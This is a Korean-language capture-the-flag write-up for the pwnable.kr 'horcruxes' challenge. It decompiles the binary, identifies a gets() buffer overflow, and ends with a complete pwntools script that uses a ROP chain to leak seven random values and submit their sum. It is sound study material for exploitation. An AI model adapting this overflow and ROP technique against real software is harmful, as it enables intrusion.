---
sort: 21
---

# horcruxes

home 디렉토리에 소스코드는 없고 그냥 binary 파일만 있다.<br>
gdb로 열심히 까보자.<br>
근데 바이너리가 좀 길어서 gdb로 분석하기 귀찮아서 그냥 바이너리파일 다운받아서 binary ninja에 넣고 돌렸다.<br>
디컴파일러는 사랑이다.<br><br>
나는 ida가 없다. ida hexray 너무 비쌈.

<img src="/picture/pwnable.kr/horcruxes_1.png" width="1000"/>

main함수에서는 hint 던지고 ABCDEFG initialize하고 syscall 부를 수 있는거 제한하고 ropme를 호출한다.

<img src="/picture/pwnable.kr/horcruxes_2.png" width="1000"/>

init_ABCDEFG함수에서는 전역변수인 a, b, c, d, e, f, g에다가 랜덤값을 집어넣고, 전역변수 sum에다가는 이들의 합을 집어넣었다.

<img src="/picture/pwnable.kr/horcruxes_3.png" width="1000"/>

input이 각각의 전역변수 a, b, c, d, e, f, g와 맞으면 A, B, C, D, E, F, G함수를 각각 호출할 수 있게 된다.<br>
근데 init_ABCDEFG에서 봤듯이 쟤네는 랜덤값이기 때문에 그냥 호출하지 말라는 소리다.<br><br>
가장 마지막 else문을 보면 gets를 사용하는 것을 확인할 수 있고, 이를 이용해서 ropme함수의 return address를 조져서 rop를 할 수 있게 된다.<br>
최상은 바로그냥 flag 호출하는 곳으로 뛰는 것이지만, ropme함수의 주소에 보면 중간에 0x0a('\n')가 들어있기 때문에 gets에 해당 주소를 넣었다간 그대로 개행에서 잘려버리고 만다.<br>
따라서 그냥 고분고분하게 호크룩스들을 모아주자.

<img src="/picture/pwnable.kr/horcruxes_4.png" width="1000"/>

각각의 A부터 G까지 함수에서 a부터 g까지 모든 값을 출력해주는 것을 확인할 수 있다.<br>
모두 호출해서 모든 값을 다 구한 다음에 다 더한 값을 구한 후 ropme를 다시 호출해서 문제를 풀자.<br>
ropme함수의 주소에는 0x0a가 끼어있기 때문에 ropme를 호출할때도 main함수에 있는 call ropme를 이용해야한다.

```python
from pwn import *

p = remote("pwnable.kr", 9032)

print(p.recvline())
print(p.recvline())
print(p.recvuntil(":"))
p.send("1\n")

print(p.recvuntil(" : "))
#      padding     A()             B()                C()              D()               E()              F()              G()             call ropme
p.send("A"*120 + p32(0x809fe4b) + p32(0x809fe6a) + p32(0x809fe89) + p32(0x809fea8) + p32(0x809fec7) + p32(0x809fee6) + p32(0x809ff05) + p32(0x0809fffc) +"\n")

print(p.recvline())
result = 0
for _ in range(7):
    print(p.recvuntil("(EXP +"))
    line = p.recvline()
    result += int(line[:-2])

print(p.recvuntil(":"))
p.send("1\n")

print(p.recvuntil(" : "))
p.send(str(result) + "\n")
p.interactive()
```

```tip
## 알게 된 점

ROP
```